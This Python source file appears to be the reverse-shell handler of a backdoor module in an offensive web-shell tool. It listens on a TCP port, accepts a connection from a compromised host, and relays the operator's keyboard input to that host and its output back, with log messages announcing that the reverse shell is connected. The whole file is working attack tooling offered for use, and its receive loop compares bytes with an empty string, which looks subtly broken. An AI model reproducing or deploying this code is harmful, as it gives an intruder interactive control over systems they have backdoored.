from core import messages
from core.loggers import log
import socket
import sys
import select

class TcpServer:

    def __init__(self, port):
        self.connect = False
        self.hostname = '0.0.0.0'
        self.port = port

        self.socket_state = False

        self.socket = None

        self.connect_socket()

        if not self.socket: return

        self.forward_data()

    def connect_socket(self):
        if(self.connect):
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.socket.connect((self.hostname, self.port))

        else:
            server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,  1)
            try:
                server.setsockopt(socket.SOL_SOCKET, socket.TCP_NODELAY, 1)
            except socket.error:
                #log.debug("Warning: unable to set TCP_NODELAY...")
                pass

            try:
                server.bind(('0.0.0.0', self.port))
            except socket.error as e:
                log.error(messages.module_backdoor_reversetcp.error_binding_socket_s % str(e))
                return

            server.listen(1)

            server.settimeout(3)

            try:
                self.socket, address = server.accept()
            except socket.timeout as e:
                server.close()
                raise


    def forward_data(self):

        log.warn(messages.module_backdoor_reversetcp.reverse_shell_connected)

        self.socket.setblocking(0)

        while(1):
            read_ready, write_ready, in_error = select.select(
                [self.socket, sys.stdin], [], [self.socket, sys.stdin])

            try:
                buf = self.socket.recv(100)
                while(buf != ''):

                    self.socket_state = True

                    sys.stdout.write(buf.decode('utf-8', 'replace'))
                    sys.stdout.flush()
                    buf = self.socket.recv(100)
                if(buf == ''):
                    return
            except socket.error:
                pass
            while(1):
                r, w, e = select.select([sys.stdin], [], [], 0)
                if(len(r) == 0):
                    break
                c = sys.stdin.read(1)
                if(c == ''):
                    return
                if(self.socket.sendall(c.encode('utf-8')) != None):
                    return
